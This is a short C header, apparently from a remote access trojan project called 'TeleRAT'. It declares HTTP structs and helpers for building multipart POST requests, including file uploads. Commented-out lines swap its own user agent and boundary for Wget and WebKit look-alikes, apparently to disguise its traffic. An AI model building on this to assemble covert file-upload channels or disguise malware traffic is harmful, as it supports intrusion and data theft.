#ifndef HTTP_HELPER_
#define HTTP_HELPER_

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define USER_AGENT "TeleRAT/0.1.0"
// #define USER_AGENT "Wget/1.17.1 (linux-gnu)"
#define SERVER "TeleRAT"
#define BOUNDARY "----TeleRATBoundary"
// #define BOUNDARY "----WebKitFormBoundary7MA4YWxkTrZu0gW"

struct http_request{
    char method[10];
    char path[256];
    char version[10];
    char host[256];
    char content_type[50];
    unsigned int content_length;
};

struct http_response{
    char version[10];
    int status_code;
    char status[100];
    char content_type[20];
    char charset[10];
    unsigned int content_length;
};

struct http_data{
    unsigned int index;
    char *data;
};

void request_header(struct http_request *request, char *buffer);
void response_header(struct http_response *response, char *buffer);
void create_boundary(char **buffer, char *data, char *input_name);
void create_file_boundary(char **buffer, char *file_path, char *input_name);
void add_post(char *buffer, char *data, char *field);
void add_file_post(char *buffer, char *filepath, char *field);
void end_post(char **buffer);
void reverse_str(char *destination, char *source);

#endif